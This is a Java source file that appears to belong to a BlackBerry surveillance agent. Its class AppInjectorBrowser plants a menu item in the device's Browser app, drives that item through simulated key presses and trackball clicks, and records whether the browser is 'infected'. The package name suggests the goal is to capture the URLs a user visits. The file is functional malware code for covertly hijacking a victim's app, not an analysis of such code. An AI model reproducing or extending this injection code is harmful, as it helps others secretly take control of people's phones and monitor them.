package blackberry.agent.url;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.AppInjectorInterface;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
    //#endif

    BrowserMenuItem menu = BrowserMenuItem.getInstance();

    private static AppInjectorBrowser instance;
    private static final long GUID = 0xa2b7338e410f087bL;
    
    boolean infected;

    public static synchronized AppInjectorBrowser getInstance() {
        if (instance == null) {
            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
                    GUID);
            if (instance == null) {
                final AppInjectorBrowser singleton = new AppInjectorBrowser();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }
    
    private AppInjectorBrowser(){
        
    }

    public boolean injectMenu() {
        menu.addMenuBrowser();
        return true;
    }

    public boolean deleteMenu() {
        menu.removeMenuBrowser();
        return true;
    }

    public boolean callMenuByKey() {

        //#ifdef DEBUG
        debug.info("calling browser menu");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(500);
        KeyInjector.pressRawKey(menu.toString().charAt(0));
        Utils.sleep(500);
        
        if(Device.getInstance().hasAdvancedClick){
            KeyInjector.trackBallClick();
        }else{
            KeyInjector.trackBallRawClick();
        }
        return true;
    }

    public String getAppName() {
        return "Browser";
    }

    public void callMenuInContext() {
        menu.callMenuInContext();

    }

    public boolean isInfected() {        
        return infected;
    }

    public void setInfected() {
        infected = true;
    }



}
